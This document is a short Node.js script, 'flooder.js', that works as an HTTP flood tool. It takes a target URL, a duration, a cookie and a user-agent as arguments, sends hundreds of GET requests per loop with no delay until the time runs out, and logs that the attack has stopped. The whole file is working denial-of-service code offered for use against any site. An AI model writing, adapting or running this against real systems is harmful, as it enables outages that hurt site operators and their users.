const target = process.argv[2];
const duration = parseInt(process.argv[3]);
const cookie = process.argv[4];
const userAgent = process.argv[5];

if (process.argv.length < 6 || isNaN(duration)) {
    console.log('Usage: node flooder.js <URL> <DURATION> <COOKIE> <USER-AGENT>');
    process.exit(1);
} else {
    console.log(`[+] Target: ${target}`);
    console.log(`[+] Duration: ${duration}s`);
    console.log(`[+] Cookie: ${cookie}`);
    console.log(`[+] User-Agent: ${userAgent}`);

    const attackInterval = setInterval(() => {
        for (let i = 0; i < 600; i++) {
            fetch(target, {
                method: 'GET',
                headers: {
                    'User-Agent': userAgent,
                    'Cookie': `${cookie}`
                }
            }).then(res => {
                console.log(`[+] Status: ${res.status}`);
            }).catch(error => {
            });
        }
    }, 0);

    setTimeout(() => {
        clearInterval(attackInterval);
        console.log('Attack stopped.');
        process.exit(0);
    }, duration * 1000);
}
